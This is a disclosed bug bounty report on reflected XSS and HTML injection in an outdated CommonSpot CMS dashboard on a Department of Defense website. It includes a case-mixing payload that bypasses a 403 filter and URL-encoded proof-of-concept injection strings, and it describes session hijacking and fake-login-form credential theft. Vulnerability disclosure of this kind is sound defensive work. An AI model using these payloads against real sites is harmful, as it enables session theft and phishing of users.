# Reflected XSS and HTML Injectionon a DoD website

## Report Details
- **Report ID**: 859342
- **URL**: https://hackerone.com/reports/859342
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-25T19:03:17.826Z
- **Disclosed**: 2020-06-11T18:15:53.031Z

## Reporter
- **Username**: natanalves01001
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Summary: I found Xss and Html injection vulnerabilities on one of the DoD websites

Description: When doing the Xss tests I used this payload: <script> alert ("XSS") </script> and when running I noticed that the server returned a 403 Forbidden error, but it was easy to do a bypass I just modified the javascript tags it was like this: <ScRipT x> alert ('XSS') </ ScRipT X> then the server returned code 404 to me, thus executing successfully without any restrictions.

## Impact: 
This vulnerability allows the attacker to send a link with the malicious code to the Administrator of that system and by clicking on the link, the session would be hijacked, thus making it possible to have administrative access in the Web application. In the Html Injection, it could be used to "spoof contents "an injection of html could be made that would pretend to be a login form of the application, and the user would try to authenticate himself and thus manage to steal his credentials. Among other examples ...


##Steps To Reproduce: 
Cross Site Scripting:
1.██████commonspot/dashboard/index.html#url=a;%3CScRipT%20X%3Ealert(%22XSS%20REFLECTED%22)%3C/ScRipT%20X%3E
2.██████████commonspot/dashboard/index.html#mode=%3CScRipT%20x%3Ealert(%22XSS%22)%3C/ScRipT%20x%3E;&url=a

Html Injection:
1.██████████commonspot/dashboard/index.html#url=a;%3Ccenter%3E%3Cimg%20src=%22███%22/%3E%3C/center%3E%3Ccenter%3E%3Ccenter%3E%3Cbr%3E%3Cfont%20color=%22red%22%20size=%2210%22%3EHTML%20INJECTION!%3C/font%3E%3C/center%3E

2.██████████commonspot/dashboard/index.html#url=a;%3Ccenter%3E%3Cimg%20src=%22███████%22/%3E%3C/center%3E%3Ccenter%3E%3Ccenter%3E%3Cbr%3E%3Cfont%20color=%22red%22%20size=%2210%22%3EHTML%20INJECTION!%3C/font%3E%3C/center%3E

## Product, Version, and Configuration 

CommonSpot 9.0 SP4 (Build 9.0.4.207) and Build: 2016-08-05 20:03:02

## Suggested Mitigation/Remediation Actions:
This system uses Commonspot (CMS) is completely out of date, I recommend installing the most updated version or installing the various security paths, here is the Commonspot (CMS) developer website: https://www.paperthin.com/

## Impact

1) It would allow an attacker to send a link with malicious code, which allows the theft of cookies, sessions, tokens, etc. If one of these administrative sessions is captured, it could allow the attacker to access the web application improperly, for example by having access to administrative page of the application.
2) Another impact would be counterfeiting of content, using HTML INJECTION.

## Attachments
No attachments
